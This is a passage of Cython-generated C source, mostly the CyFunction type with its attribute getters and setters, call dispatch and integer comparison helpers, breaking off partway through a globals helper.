static CYTHON_INLINE int __Pyx_PyObject_Append(PyObject* L, PyObject* x) {
    if (likely(PyList_CheckExact(L))) {
        if (unlikely(__Pyx_PyList_Append(L, x) < 0)) return -1;
    }
    else {
        PyObject* retval = __Pyx_PyObject_CallMethod1(L, __pyx_n_s_append, x);
        if (unlikely(!retval))
            return -1;
        Py_DECREF(retval);
    }
    return 0;
}
static PyTypeObject* __Pyx_FetchCommonType(PyTypeObject* type) {
    PyObject* fake_module;
    PyTypeObject* cached_type = NULL;
    fake_module = PyImport_AddModule((char*)"_cython_" CYTHON_ABI);
    if (!fake_module) return NULL;
    Py_INCREF(fake_module);
    cached_type = (PyTypeObject*)PyObject_GetAttrString(fake_module, type->tp_name);
    if (cached_type) {
        if (!PyType_Check((PyObject*)cached_type)) {
            PyErr_Format(PyExc_TypeError,
                "Shared Cython type %.200s is not a type object",
                type->tp_name);
            goto bad;
        }
        if (cached_type->tp_basicsize != type->tp_basicsize) {
            PyErr_Format(PyExc_TypeError,
                "Shared Cython type %.200s has the wrong size, try recompiling",
                type->tp_name);
            goto bad;
        }
    }
    else {
        if (!PyErr_ExceptionMatches(PyExc_AttributeError)) goto bad;
        PyErr_Clear();
        if (PyType_Ready(type) < 0) goto bad;
        if (PyObject_SetAttrString(fake_module, type->tp_name, (PyObject*)type) < 0)
            goto bad;
        Py_INCREF(type);
        cached_type = type;
    }
done:
    Py_DECREF(fake_module);
    return cached_type;
bad:
    Py_XDECREF(cached_type);
    cached_type = NULL;
    goto done;
}
#include <structmember.h>
static PyObject*
__Pyx_CyFunction_get_doc(__pyx_CyFunctionObject* op, CYTHON_UNUSED void* closure)
{
    if (unlikely(op->func_doc == NULL)) {
        if (op->func.m_ml->ml_doc) {
#if PY_MAJOR_VERSION >= 3
            op->func_doc = PyUnicode_FromString(op->func.m_ml->ml_doc);
#else
            op->func_doc = PyString_FromString(op->func.m_ml->ml_doc);
#endif
            if (unlikely(op->func_doc == NULL))
                return NULL;
        }
        else {
            Py_INCREF(Py_None);
            return Py_None;
        }
    }
    Py_INCREF(op->func_doc);
    return op->func_doc;
}
static int
__Pyx_CyFunction_set_doc(__pyx_CyFunctionObject* op, PyObject* value, CYTHON_UNUSED void* context)
{
    PyObject* tmp = op->func_doc;
    if (value == NULL) {
        value = Py_None;
    }
    Py_INCREF(value);
    op->func_doc = value;
    Py_XDECREF(tmp);
    return 0;
}
static PyObject*
__Pyx_CyFunction_get_name(__pyx_CyFunctionObject* op, CYTHON_UNUSED void* context)
{
    if (unlikely(op->func_name == NULL)) {
#if PY_MAJOR_VERSION >= 3
        op->func_name = PyUnicode_InternFromString(op->func.m_ml->ml_name);
#else
        op->func_name = PyString_InternFromString(op->func.m_ml->ml_name);
#endif
        if (unlikely(op->func_name == NULL))
            return NULL;
    }
    Py_INCREF(op->func_name);
    return op->func_name;
}
static int
__Pyx_CyFunction_set_name(__pyx_CyFunctionObject* op, PyObject* value, CYTHON_UNUSED void* context)
{
    PyObject* tmp;
#if PY_MAJOR_VERSION >= 3
    if (unlikely(value == NULL || !PyUnicode_Check(value)))
#else
    if (unlikely(value == NULL || !PyString_Check(value)))
#endif
    {
        PyErr_SetString(PyExc_TypeError,
            "__name__ must be set to a string object");
        return -1;
    }
    tmp = op->func_name;
    Py_INCREF(value);
    op->func_name = value;
    Py_XDECREF(tmp);
    return 0;
}
static PyObject*
__Pyx_CyFunction_get_qualname(__pyx_CyFunctionObject* op, CYTHON_UNUSED void* context)
{
    Py_INCREF(op->func_qualname);
    return op->func_qualname;
}
static int
__Pyx_CyFunction_set_qualname(__pyx_CyFunctionObject* op, PyObject* value, CYTHON_UNUSED void* context)
{
    PyObject* tmp;
#if PY_MAJOR_VERSION >= 3
    if (unlikely(value == NULL || !PyUnicode_Check(value)))
#else
    if (unlikely(value == NULL || !PyString_Check(value)))
#endif
    {
        PyErr_SetString(PyExc_TypeError,
            "__qualname__ must be set to a string object");
        return -1;
    }
    tmp = op->func_qualname;
    Py_INCREF(value);
    op->func_qualname = value;
    Py_XDECREF(tmp);
    return 0;
}
static PyObject*
__Pyx_CyFunction_get_self(__pyx_CyFunctionObject* m, CYTHON_UNUSED void* closure)
{
    PyObject* self;
    self = m->func_closure;
    if (self == NULL)
        self = Py_None;
    Py_INCREF(self);
    return self;
}
static PyObject*
__Pyx_CyFunction_get_dict(__pyx_CyFunctionObject* op, CYTHON_UNUSED void* context)
{
    if (unlikely(op->func_dict == NULL)) {
        op->func_dict = PyDict_New();
        if (unlikely(op->func_dict == NULL))
            return NULL;
    }
    Py_INCREF(op->func_dict);
    return op->func_dict;
}
static int
__Pyx_CyFunction_set_dict(__pyx_CyFunctionObject* op, PyObject* value, CYTHON_UNUSED void* context)
{
    PyObject* tmp;
    if (unlikely(value == NULL)) {
        PyErr_SetString(PyExc_TypeError,
            "function's dictionary may not be deleted");
        return -1;
    }
    if (unlikely(!PyDict_Check(value))) {
        PyErr_SetString(PyExc_TypeError,
            "setting function's dictionary to a non-dict");
        return -1;
    }
    tmp = op->func_dict;
    Py_INCREF(value);
    op->func_dict = value;
    Py_XDECREF(tmp);
    return 0;
}
static PyObject*
__Pyx_CyFunction_get_globals(__pyx_CyFunctionObject* op, CYTHON_UNUSED void* context)
{
    Py_INCREF(op->func_globals);
    return op->func_globals;
}
static PyObject*
__Pyx_CyFunction_get_closure(CYTHON_UNUSED __pyx_CyFunctionObject* op, CYTHON_UNUSED void* context)
{
    Py_INCREF(Py_None);
    return Py_None;
}
static PyObject*
__Pyx_CyFunction_get_code(__pyx_CyFunctionObject* op, CYTHON_UNUSED void* context)
{
    PyObject* result = (op->func_code) ? op->func_code : Py_None;
    Py_INCREF(result);
    return result;
}
static int
__Pyx_CyFunction_init_defaults(__pyx_CyFunctionObject* op) {
    int result = 0;
    PyObject* res = op->defaults_getter((PyObject*)op);
    if (unlikely(!res))
        return -1;
#if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
    op->defaults_tuple = PyTuple_GET_ITEM(res, 0);
    Py_INCREF(op->defaults_tuple);
    op->defaults_kwdict = PyTuple_GET_ITEM(res, 1);
    Py_INCREF(op->defaults_kwdict);
#else
    op->defaults_tuple = PySequence_ITEM(res, 0);
    if (unlikely(!op->defaults_tuple)) result = -1;
    else {
        op->defaults_kwdict = PySequence_ITEM(res, 1);
        if (unlikely(!op->defaults_kwdict)) result = -1;
    }
#endif
    Py_DECREF(res);
    return result;
}
static int
__Pyx_CyFunction_set_defaults(__pyx_CyFunctionObject* op, PyObject* value, CYTHON_UNUSED void* context) {
    PyObject* tmp;
    if (!value) {
        value = Py_None;
    }
    else if (value != Py_None && !PyTuple_Check(value)) {
        PyErr_SetString(PyExc_TypeError,
            "__defaults__ must be set to a tuple object");
        return -1;
    }
    Py_INCREF(value);
    tmp = op->defaults_tuple;
    op->defaults_tuple = value;
    Py_XDECREF(tmp);
    return 0;
}
static PyObject*
__Pyx_CyFunction_get_defaults(__pyx_CyFunctionObject* op, CYTHON_UNUSED void* context) {
    PyObject* result = op->defaults_tuple;
    if (unlikely(!result)) {
        if (op->defaults_getter) {
            if (__Pyx_CyFunction_init_defaults(op) < 0) return NULL;
            result = op->defaults_tuple;
        }
        else {
            result = Py_None;
        }
    }
    Py_INCREF(result);
    return result;
}
static int
__Pyx_CyFunction_set_kwdefaults(__pyx_CyFunctionObject* op, PyObject* value, CYTHON_UNUSED void* context) {
    PyObject* tmp;
    if (!value) {
        value = Py_None;
    }
    else if (value != Py_None && !PyDict_Check(value)) {
        PyErr_SetString(PyExc_TypeError,
            "__kwdefaults__ must be set to a dict object");
        return -1;
    }
    Py_INCREF(value);
    tmp = op->defaults_kwdict;
    op->defaults_kwdict = value;
    Py_XDECREF(tmp);
    return 0;
}
static PyObject*
__Pyx_CyFunction_get_kwdefaults(__pyx_CyFunctionObject* op, CYTHON_UNUSED void* context) {
    PyObject* result = op->defaults_kwdict;
    if (unlikely(!result)) {
        if (op->defaults_getter) {
            if (__Pyx_CyFunction_init_defaults(op) < 0) return NULL;
            result = op->defaults_kwdict;
        }
        else {
            result = Py_None;
        }
    }
    Py_INCREF(result);
    return result;
}
static int
__Pyx_CyFunction_set_annotations(__pyx_CyFunctionObject* op, PyObject* value, CYTHON_UNUSED void* context) {
    PyObject* tmp;
    if (!value || value == Py_None) {
        value = NULL;
    }
    else if (!PyDict_Check(value)) {
        PyErr_SetString(PyExc_TypeError,
            "__annotations__ must be set to a dict object");
        return -1;
    }
    Py_XINCREF(value);
    tmp = op->func_annotations;
    op->func_annotations = value;
    Py_XDECREF(tmp);
    return 0;
}
static PyObject*
__Pyx_CyFunction_get_annotations(__pyx_CyFunctionObject* op, CYTHON_UNUSED void* context) {
    PyObject* result = op->func_annotations;
    if (unlikely(!result)) {
        result = PyDict_New();
        if (unlikely(!result)) return NULL;
        op->func_annotations = result;
    }
    Py_INCREF(result);
    return result;
}
static PyGetSetDef __pyx_CyFunction_getsets[] = {
    {(char*)"func_doc", (getter)__Pyx_CyFunction_get_doc, (setter)__Pyx_CyFunction_set_doc, 0, 0},
    {(char*)"__doc__",  (getter)__Pyx_CyFunction_get_doc, (setter)__Pyx_CyFunction_set_doc, 0, 0},
    {(char*)"func_name", (getter)__Pyx_CyFunction_get_name, (setter)__Pyx_CyFunction_set_name, 0, 0},
    {(char*)"__name__", (getter)__Pyx_CyFunction_get_name, (setter)__Pyx_CyFunction_set_name, 0, 0},
    {(char*)"__qualname__", (getter)__Pyx_CyFunction_get_qualname, (setter)__Pyx_CyFunction_set_qualname, 0, 0},
    {(char*)"__self__", (getter)__Pyx_CyFunction_get_self, 0, 0, 0},
    {(char*)"func_dict", (getter)__Pyx_CyFunction_get_dict, (setter)__Pyx_CyFunction_set_dict, 0, 0},
    {(char*)"__dict__", (getter)__Pyx_CyFunction_get_dict, (setter)__Pyx_CyFunction_set_dict, 0, 0},
    {(char*)"func_globals", (getter)__Pyx_CyFunction_get_globals, 0, 0, 0},
    {(char*)"__globals__", (getter)__Pyx_CyFunction_get_globals, 0, 0, 0},
    {(char*)"func_closure", (getter)__Pyx_CyFunction_get_closure, 0, 0, 0},
    {(char*)"__closure__", (getter)__Pyx_CyFunction_get_closure, 0, 0, 0},
    {(char*)"func_code", (getter)__Pyx_CyFunction_get_code, 0, 0, 0},
    {(char*)"__code__", (getter)__Pyx_CyFunction_get_code, 0, 0, 0},
    {(char*)"func_defaults", (getter)__Pyx_CyFunction_get_defaults, (setter)__Pyx_CyFunction_set_defaults, 0, 0},
    {(char*)"__defaults__", (getter)__Pyx_CyFunction_get_defaults, (setter)__Pyx_CyFunction_set_defaults, 0, 0},
    {(char*)"__kwdefaults__", (getter)__Pyx_CyFunction_get_kwdefaults, (setter)__Pyx_CyFunction_set_kwdefaults, 0, 0},
    {(char*)"__annotations__", (getter)__Pyx_CyFunction_get_annotations, (setter)__Pyx_CyFunction_set_annotations, 0, 0},
    {0, 0, 0, 0, 0}
};
static PyMemberDef __pyx_CyFunction_members[] = {
    {(char*)"__module__", T_OBJECT, offsetof(PyCFunctionObject, m_module), PY_WRITE_RESTRICTED, 0},
    {0, 0, 0,  0, 0}
};
static PyObject*
__Pyx_CyFunction_reduce(__pyx_CyFunctionObject* m, CYTHON_UNUSED PyObject* args)
{
#if PY_MAJOR_VERSION >= 3
    Py_INCREF(m->func_qualname);
    return m->func_qualname;
#else
    return PyString_FromString(m->func.m_ml->ml_name);
#endif
}
static PyMethodDef __pyx_CyFunction_methods[] = {
    {"__reduce__", (PyCFunction)__Pyx_CyFunction_reduce, METH_VARARGS, 0},
    {0, 0, 0, 0}
};
#if PY_VERSION_HEX < 0x030500A0
#define __Pyx_CyFunction_weakreflist(cyfunc) ((cyfunc)->func_weakreflist)
#else
#define __Pyx_CyFunction_weakreflist(cyfunc) ((cyfunc)->func.m_weakreflist)
#endif
static PyObject* __Pyx_CyFunction_Init(__pyx_CyFunctionObject* op, PyMethodDef* ml, int flags, PyObject* qualname,
    PyObject* closure, PyObject* module, PyObject* globals, PyObject* code) {
    if (unlikely(op == NULL))
        return NULL;
    op->flags = flags;
    __Pyx_CyFunction_weakreflist(op) = NULL;
    op->func.m_ml = ml;
    op->func.m_self = (PyObject*)op;
    Py_XINCREF(closure);
    op->func_closure = closure;
    Py_XINCREF(module);
    op->func.m_module = module;
    op->func_dict = NULL;
    op->func_name = NULL;
    Py_INCREF(qualname);
    op->func_qualname = qualname;
    op->func_doc = NULL;
    op->func_classobj = NULL;
    op->func_globals = globals;
    Py_INCREF(op->func_globals);
    Py_XINCREF(code);
    op->func_code = code;
    op->defaults_pyobjects = 0;
    op->defaults_size = 0;
    op->defaults = NULL;
    op->defaults_tuple = NULL;
    op->defaults_kwdict = NULL;
    op->defaults_getter = NULL;
    op->func_annotations = NULL;
    return (PyObject*)op;
}
static int
__Pyx_CyFunction_clear(__pyx_CyFunctionObject* m)
{
    Py_CLEAR(m->func_closure);
    Py_CLEAR(m->func.m_module);
    Py_CLEAR(m->func_dict);
    Py_CLEAR(m->func_name);
    Py_CLEAR(m->func_qualname);
    Py_CLEAR(m->func_doc);
    Py_CLEAR(m->func_globals);
    Py_CLEAR(m->func_code);
    Py_CLEAR(m->func_classobj);
    Py_CLEAR(m->defaults_tuple);
    Py_CLEAR(m->defaults_kwdict);
    Py_CLEAR(m->func_annotations);
    if (m->defaults) {
        PyObject** pydefaults = __Pyx_CyFunction_Defaults(PyObject*, m);
        int i;
        for (i = 0; i < m->defaults_pyobjects; i++)
            Py_XDECREF(pydefaults[i]);
        PyObject_Free(m->defaults);
        m->defaults = NULL;
    }
    return 0;
}
static void __Pyx__CyFunction_dealloc(__pyx_CyFunctionObject* m)
{
    if (__Pyx_CyFunction_weakreflist(m) != NULL)
        PyObject_ClearWeakRefs((PyObject*)m);
    __Pyx_CyFunction_clear(m);
    PyObject_GC_Del(m);
}
static void __Pyx_CyFunction_dealloc(__pyx_CyFunctionObject* m)
{
    PyObject_GC_UnTrack(m);
    __Pyx__CyFunction_dealloc(m);
}
static int __Pyx_CyFunction_traverse(__pyx_CyFunctionObject* m, visitproc visit, void* arg)
{
    Py_VISIT(m->func_closure);
    Py_VISIT(m->func.m_module);
    Py_VISIT(m->func_dict);
    Py_VISIT(m->func_name);
    Py_VISIT(m->func_qualname);
    Py_VISIT(m->func_doc);
    Py_VISIT(m->func_globals);
    Py_VISIT(m->func_code);
    Py_VISIT(m->func_classobj);
    Py_VISIT(m->defaults_tuple);
    Py_VISIT(m->defaults_kwdict);
    if (m->defaults) {
        PyObject** pydefaults = __Pyx_CyFunction_Defaults(PyObject*, m);
        int i;
        for (i = 0; i < m->defaults_pyobjects; i++)
            Py_VISIT(pydefaults[i]);
    }
    return 0;
}
static PyObject* __Pyx_CyFunction_descr_get(PyObject* func, PyObject* obj, PyObject* type)
{
#if PY_MAJOR_VERSION < 3
    __pyx_CyFunctionObject* m = (__pyx_CyFunctionObject*)func;
    if (m->flags & __Pyx_CYFUNCTION_STATICMETHOD) {
        Py_INCREF(func);
        return func;
    }
    if (m->flags & __Pyx_CYFUNCTION_CLASSMETHOD) {
        if (type == NULL)
            type = (PyObject*)(Py_TYPE(obj));
        return __Pyx_PyMethod_New(func, type, (PyObject*)(Py_TYPE(type)));
    }
    if (obj == Py_None)
        obj = NULL;
#endif
    return __Pyx_PyMethod_New(func, obj, type);
}
static PyObject*
__Pyx_CyFunction_repr(__pyx_CyFunctionObject* op)
{
#if PY_MAJOR_VERSION >= 3
    return PyUnicode_FromFormat("<cyfunction %U at %p>",
        op->func_qualname, (void*)op);
#else
    return PyString_FromFormat("<cyfunction %s at %p>",
        PyString_AsString(op->func_qualname), (void*)op);
#endif
}
static PyObject* __Pyx_CyFunction_CallMethod(PyObject* func, PyObject* self, PyObject* arg, PyObject* kw) {
    PyCFunctionObject* f = (PyCFunctionObject*)func;
    PyCFunction meth = f->m_ml->ml_meth;
    Py_ssize_t size;
    switch (f->m_ml->ml_flags & (METH_VARARGS | METH_KEYWORDS | METH_NOARGS | METH_O)) {
    case METH_VARARGS:
        if (likely(kw == NULL || PyDict_Size(kw) == 0))
            return (*meth)(self, arg);
        break;
    case METH_VARARGS | METH_KEYWORDS:
        return (*(PyCFunctionWithKeywords)(void*)meth)(self, arg, kw);
    case METH_NOARGS:
        if (likely(kw == NULL || PyDict_Size(kw) == 0)) {
            size = PyTuple_GET_SIZE(arg);
            if (likely(size == 0))
                return (*meth)(self, NULL);
            PyErr_Format(PyExc_TypeError,
                "%.200s() takes no arguments (%" CYTHON_FORMAT_SSIZE_T "d given)",
                f->m_ml->ml_name, size);
            return NULL;
        }
        break;
    case METH_O:
        if (likely(kw == NULL || PyDict_Size(kw) == 0)) {
            size = PyTuple_GET_SIZE(arg);
            if (likely(size == 1)) {
                PyObject* result, * arg0;
#if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
                arg0 = PyTuple_GET_ITEM(arg, 0);
#else
                arg0 = PySequence_ITEM(arg, 0); if (unlikely(!arg0)) return NULL;
#endif
                result = (*meth)(self, arg0);
#if !(CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS)
                Py_DECREF(arg0);
#endif
                return result;
            }
            PyErr_Format(PyExc_TypeError,
                "%.200s() takes exactly one argument (%" CYTHON_FORMAT_SSIZE_T "d given)",
                f->m_ml->ml_name, size);
            return NULL;
        }
        break;
    default:
        PyErr_SetString(PyExc_SystemError, "Bad call flags in "
            "__Pyx_CyFunction_Call. METH_OLDARGS is no "
            "longer supported!");
        return NULL;
    }
    PyErr_Format(PyExc_TypeError, "%.200s() takes no keyword arguments",
        f->m_ml->ml_name);
    return NULL;
}
static CYTHON_INLINE PyObject* __Pyx_CyFunction_Call(PyObject* func, PyObject* arg, PyObject* kw) {
    return __Pyx_CyFunction_CallMethod(func, ((PyCFunctionObject*)func)->m_self, arg, kw);
}
static PyObject* __Pyx_CyFunction_CallAsMethod(PyObject* func, PyObject* args, PyObject* kw) {
    PyObject* result;
    __pyx_CyFunctionObject* cyfunc = (__pyx_CyFunctionObject*)func;
    if ((cyfunc->flags & __Pyx_CYFUNCTION_CCLASS) && !(cyfunc->flags & __Pyx_CYFUNCTION_STATICMETHOD)) {
        Py_ssize_t argc;
        PyObject* new_args;
        PyObject* self;
        argc = PyTuple_GET_SIZE(args);
        new_args = PyTuple_GetSlice(args, 1, argc);
        if (unlikely(!new_args))
            return NULL;
        self = PyTuple_GetItem(args, 0);
        if (unlikely(!self)) {
            Py_DECREF(new_args);
            PyErr_Format(PyExc_TypeError,
                "unbound method %.200S() needs an argument",
                cyfunc->func_qualname);
            return NULL;
        }
        result = __Pyx_CyFunction_CallMethod(func, self, new_args, kw);
        Py_DECREF(new_args);
    }
    else {
        result = __Pyx_CyFunction_Call(func, args, kw);
    }
    return result;
}
static PyTypeObject __pyx_CyFunctionType_type = {
    PyVarObject_HEAD_INIT(0, 0)
    "cython_function_or_method",
    sizeof(__pyx_CyFunctionObject),
    0,
    (destructor)__Pyx_CyFunction_dealloc,
    0,
    0,
    0,
#if PY_MAJOR_VERSION < 3
    0,
#else
    0,
#endif
    (reprfunc)__Pyx_CyFunction_repr,
    0,
    0,
    0,
    0,
    __Pyx_CyFunction_CallAsMethod,
    0,
    0,
    0,
    0,
    Py_TPFLAGS_DEFAULT | Py_TPFLAGS_HAVE_GC,
    0,
    (traverseproc)__Pyx_CyFunction_traverse,
    (inquiry)__Pyx_CyFunction_clear,
    0,
#if PY_VERSION_HEX < 0x030500A0
    offsetof(__pyx_CyFunctionObject, func_weakreflist),
#else
    offsetof(PyCFunctionObject, m_weakreflist),
#endif
    0,
    0,
    __pyx_CyFunction_methods,
    __pyx_CyFunction_members,
    __pyx_CyFunction_getsets,
    0,
    0,
    __Pyx_CyFunction_descr_get,
    0,
    offsetof(__pyx_CyFunctionObject, func_dict),
    0,
    0,
    0,
    0,
    0,
    0,
    0,
    0,
    0,
    0,
    0,
    0,
#if PY_VERSION_HEX >= 0x030400a1
    0,
#endif
#if PY_VERSION_HEX >= 0x030800b1 && (!CYTHON_COMPILING_IN_PYPY || PYPY_VERSION_NUM >= 0x07030800)
    0,
#endif
#if PY_VERSION_HEX >= 0x030800b4 && PY_VERSION_HEX < 0x03090000
    0,
#endif
#if CYTHON_COMPILING_IN_PYPY && PY_VERSION_HEX >= 0x03090000
    0,
#endif
};
static int __pyx_CyFunction_init(void) {
    __pyx_CyFunctionType = __Pyx_FetchCommonType(&__pyx_CyFunctionType_type);
    if (unlikely(__pyx_CyFunctionType == NULL)) {
        return -1;
    }
    return 0;
}
static CYTHON_INLINE void* __Pyx_CyFunction_InitDefaults(PyObject* func, size_t size, int pyobjects) {
    __pyx_CyFunctionObject* m = (__pyx_CyFunctionObject*)func;
    m->defaults = PyObject_Malloc(size);
    if (unlikely(!m->defaults))
        return PyErr_NoMemory();
    memset(m->defaults, 0, size);
    m->defaults_pyobjects = pyobjects;
    m->defaults_size = size;
    return m->defaults;
}
static CYTHON_INLINE void __Pyx_CyFunction_SetDefaultsTuple(PyObject* func, PyObject* tuple) {
    __pyx_CyFunctionObject* m = (__pyx_CyFunctionObject*)func;
    m->defaults_tuple = tuple;
    Py_INCREF(tuple);
}
static CYTHON_INLINE void __Pyx_CyFunction_SetDefaultsKwDict(PyObject* func, PyObject* dict) {
    __pyx_CyFunctionObject* m = (__pyx_CyFunctionObject*)func;
    m->defaults_kwdict = dict;
    Py_INCREF(dict);
}
static CYTHON_INLINE void __Pyx_CyFunction_SetAnnotationsDict(PyObject* func, PyObject* dict) {
    __pyx_CyFunctionObject* m = (__pyx_CyFunctionObject*)func;
    m->func_annotations = dict;
    Py_INCREF(dict);
}
static PyObject* __Pyx_CyFunction_New(PyMethodDef* ml, int flags, PyObject* qualname,
    PyObject* closure, PyObject* module, PyObject* globals, PyObject* code) {
    PyObject* op = __Pyx_CyFunction_Init(
        PyObject_GC_New(__pyx_CyFunctionObject, __pyx_CyFunctionType),
        ml, flags, qualname, closure, module, globals, code
    );
    if (likely(op)) {
        PyObject_GC_Track(op);
    }
    return op;
}
static PyObject* __Pyx_ImportFrom(PyObject* module, PyObject* name) {
    PyObject* value = __Pyx_PyObject_GetAttrStr(module, name);
    if (unlikely(!value) && PyErr_ExceptionMatches(PyExc_AttributeError)) {
        PyErr_Format(PyExc_ImportError,
#if PY_MAJOR_VERSION < 3
            "cannot import name %.230s", PyString_AS_STRING(name));
#else
            "cannot import name %S", name);
#endif
    }
    return value;
}
static CYTHON_INLINE PyObject* __Pyx_PyInt_NeObjC(PyObject* op1, PyObject* op2, CYTHON_UNUSED long intval, CYTHON_UNUSED long inplace) {
    if (op1 == op2) {
        Py_RETURN_FALSE;
    }
#if PY_MAJOR_VERSION < 3
    if (likely(PyInt_CheckExact(op1))) {
        const long b = intval;
        long a = PyInt_AS_LONG(op1);
        if (a != b) Py_RETURN_TRUE; else Py_RETURN_FALSE;
    }
#endif
#if CYTHON_USE_PYLONG_INTERNALS
    if (likely(PyLong_CheckExact(op1))) {
        int unequal;
        unsigned long uintval;
        Py_ssize_t size = Py_SIZE(op1);
        const digit* digits = ((PyLongObject*)op1)->ob_digit;
        if (intval == 0) {
            if (size != 0) Py_RETURN_TRUE; else Py_RETURN_FALSE;
        }
        else if (intval < 0) {
            if (size >= 0)
                Py_RETURN_TRUE;
            intval = -intval;
            size = -size;
        }
        else {
            if (size <= 0)
                Py_RETURN_TRUE;
        }
        uintval = (unsigned long)intval;
#if PyLong_SHIFT * 4 < SIZEOF_LONG*8
        if (uintval >> (PyLong_SHIFT * 4)) {
            unequal = (size != 5) || (digits[0] != (uintval & (unsigned long)PyLong_MASK))
                | (digits[1] != ((uintval >> (1 * PyLong_SHIFT)) & (unsigned long)PyLong_MASK)) | (digits[2] != ((uintval >> (2 * PyLong_SHIFT)) & (unsigned long)PyLong_MASK)) | (digits[3] != ((uintval >> (3 * PyLong_SHIFT)) & (unsigned long)PyLong_MASK)) | (digits[4] != ((uintval >> (4 * PyLong_SHIFT)) & (unsigned long)PyLong_MASK));
        }
        else
#endif
#if PyLong_SHIFT * 3 < SIZEOF_LONG*8
            if (uintval >> (PyLong_SHIFT * 3)) {
                unequal = (size != 4) || (digits[0] != (uintval & (unsigned long)PyLong_MASK))
                    | (digits[1] != ((uintval >> (1 * PyLong_SHIFT)) & (unsigned long)PyLong_MASK)) | (digits[2] != ((uintval >> (2 * PyLong_SHIFT)) & (unsigned long)PyLong_MASK)) | (digits[3] != ((uintval >> (3 * PyLong_SHIFT)) & (unsigned long)PyLong_MASK));
            }
            else
#endif
#if PyLong_SHIFT * 2 < SIZEOF_LONG*8
                if (uintval >> (PyLong_SHIFT * 2)) {
                    unequal = (size != 3) || (digits[0] != (uintval & (unsigned long)PyLong_MASK))
                        | (digits[1] != ((uintval >> (1 * PyLong_SHIFT)) & (unsigned long)PyLong_MASK)) | (digits[2] != ((uintval >> (2 * PyLong_SHIFT)) & (unsigned long)PyLong_MASK));
                }
                else
#endif
#if PyLong_SHIFT * 1 < SIZEOF_LONG*8
                    if (uintval >> (PyLong_SHIFT * 1)) {
                        unequal = (size != 2) || (digits[0] != (uintval & (unsigned long)PyLong_MASK))
                            | (digits[1] != ((uintval >> (1 * PyLong_SHIFT)) & (unsigned long)PyLong_MASK));
                    }
                    else
#endif
                        unequal = (size != 1) || (((unsigned long)digits[0]) != (uintval & (unsigned long)PyLong_MASK));
        if (unequal != 0) Py_RETURN_TRUE; else Py_RETURN_FALSE;
    }
#endif
    if (PyFloat_CheckExact(op1)) {
        const long b = intval;
        double a = PyFloat_AS_DOUBLE(op1);
        if ((double)a != (double)b) Py_RETURN_TRUE; else Py_RETURN_FALSE;
    }
    return (
        PyObject_RichCompare(op1, op2, Py_NE));
}
static CYTHON_INLINE PyObject* __Pyx_PyInt_EqObjC(PyObject* op1, PyObject* op2, CYTHON_UNUSED long intval, CYTHON_UNUSED long inplace) {
    if (op1 == op2) {
        Py_RETURN_TRUE;
    }
#if PY_MAJOR_VERSION < 3
    if (likely(PyInt_CheckExact(op1))) {
        const long b = intval;
        long a = PyInt_AS_LONG(op1);
        if (a == b) Py_RETURN_TRUE; else Py_RETURN_FALSE;
    }
#endif
#if CYTHON_USE_PYLONG_INTERNALS
    if (likely(PyLong_CheckExact(op1))) {
        int unequal;
        unsigned long uintval;
        Py_ssize_t size = Py_SIZE(op1);
        const digit* digits = ((PyLongObject*)op1)->ob_digit;
        if (intval == 0) {
            if (size == 0) Py_RETURN_TRUE; else Py_RETURN_FALSE;
        }
        else if (intval < 0) {
            if (size >= 0)
                Py_RETURN_FALSE;
            intval = -intval;
            size = -size;
        }
        else {
            if (size <= 0)
                Py_RETURN_FALSE;
        }
        uintval = (unsigned long)intval;
#if PyLong_SHIFT * 4 < SIZEOF_LONG*8
        if (uintval >> (PyLong_SHIFT * 4)) {
            unequal = (size != 5) || (digits[0] != (uintval & (unsigned long)PyLong_MASK))
                | (digits[1] != ((uintval >> (1 * PyLong_SHIFT)) & (unsigned long)PyLong_MASK)) | (digits[2] != ((uintval >> (2 * PyLong_SHIFT)) & (unsigned long)PyLong_MASK)) | (digits[3] != ((uintval >> (3 * PyLong_SHIFT)) & (unsigned long)PyLong_MASK)) | (digits[4] != ((uintval >> (4 * PyLong_SHIFT)) & (unsigned long)PyLong_MASK));
        }
        else
#endif
#if PyLong_SHIFT * 3 < SIZEOF_LONG*8
            if (uintval >> (PyLong_SHIFT * 3)) {
                unequal = (size != 4) || (digits[0] != (uintval & (unsigned long)PyLong_MASK))
                    | (digits[1] != ((uintval >> (1 * PyLong_SHIFT)) & (unsigned long)PyLong_MASK)) | (digits[2] != ((uintval >> (2 * PyLong_SHIFT)) & (unsigned long)PyLong_MASK)) | (digits[3] != ((uintval >> (3 * PyLong_SHIFT)) & (unsigned long)PyLong_MASK));
            }
            else
#endif
#if PyLong_SHIFT * 2 < SIZEOF_LONG*8
                if (uintval >> (PyLong_SHIFT * 2)) {
                    unequal = (size != 3) || (digits[0] != (uintval & (unsigned long)PyLong_MASK))
                        | (digits[1] != ((uintval >> (1 * PyLong_SHIFT)) & (unsigned long)PyLong_MASK)) | (digits[2] != ((uintval >> (2 * PyLong_SHIFT)) & (unsigned long)PyLong_MASK));
                }
                else
#endif
#if PyLong_SHIFT * 1 < SIZEOF_LONG*8
                    if (uintval >> (PyLong_SHIFT * 1)) {
                        unequal = (size != 2) || (digits[0] != (uintval & (unsigned long)PyLong_MASK))
                            | (digits[1] != ((uintval >> (1 * PyLong_SHIFT)) & (unsigned long)PyLong_MASK));
                    }
                    else
#endif
                        unequal = (size != 1) || (((unsigned long)digits[0]) != (uintval & (unsigned long)PyLong_MASK));
        if (unequal == 0) Py_RETURN_TRUE; else Py_RETURN_FALSE;
    }
#endif
    if (PyFloat_CheckExact(op1)) {
        const long b = intval;
        double a = PyFloat_AS_DOUBLE(op1);
        if ((double)a == (double)b) Py_RETURN_TRUE; else Py_RETURN_FALSE;
    }
    return (
        PyObject_RichCompare(op1, op2, Py_EQ));
}
static PyObject* __Pyx_Globals(void) {
    Py_ssize_t i;
    PyObject* names;
    PyObject* globals = __pyx_d;
    Py_INCREF(globals);
    names = PyObject_Dir(__pyx_m);
    if (!names)
        goto bad;
    for (i = PyList_GET_SIZE(names) - 1; i >= 0; i--) {
#if CYTHON_COMPILING_IN_PYPY
        PyObject* name = PySequence_ITEM(names, i);
        if (!name)
            goto bad;
#else
        PyObject* name = PyList_GET_ITEM(names, i);
#endif
        if (!PyDict_Contains(globals, name)) {
            PyObject* value = __Pyx_GetAttr(__pyx_m, name);
            if (!value) {
#if CYTHON_COMPILING_IN_PYPY
                Py_DECREF(name);
#endif
                goto bad;
            }
